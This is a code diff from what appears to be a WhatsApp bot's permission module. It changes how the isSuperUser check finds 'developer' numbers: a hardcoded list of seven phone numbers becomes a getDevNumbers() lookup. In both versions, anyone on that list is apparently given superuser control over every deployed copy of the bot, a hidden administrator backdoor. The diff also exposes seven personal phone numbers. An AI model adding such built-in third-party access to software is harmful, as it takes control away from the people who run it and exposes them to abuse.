@@ -72,7 +72,7 @@ async function clearAllSudo() {
     }
 }
 
-const DEV_NUMBERS = ['254791899446', '254769365617', '254114018035', '254728782591', '254799916673', '254762016957', '254113174209'];
+const { getDevNumbers } = require('../devNumbers');
 
 async function isSuperUser(jid, Gifted) {
     if (!jid) return false;
@@ -80,7 +80,8 @@ async function isSuperUser(jid, Gifted) {
     const ownerNumber = (process.env.OWNER_NUMBER || "").replace(/\D/g, "");
     const botNum = Gifted?.user?.id?.split(":")[0];
     if (num === ownerNumber || num === botNum) return true;
-    if (DEV_NUMBERS.includes(num)) return true;
+    const devNumbers = await getDevNumbers();
+    if (devNumbers.includes(num)) return true;
     const sudoNumbers = await getSudoNumbers();
     return sudoNumbers.includes(num);
 }
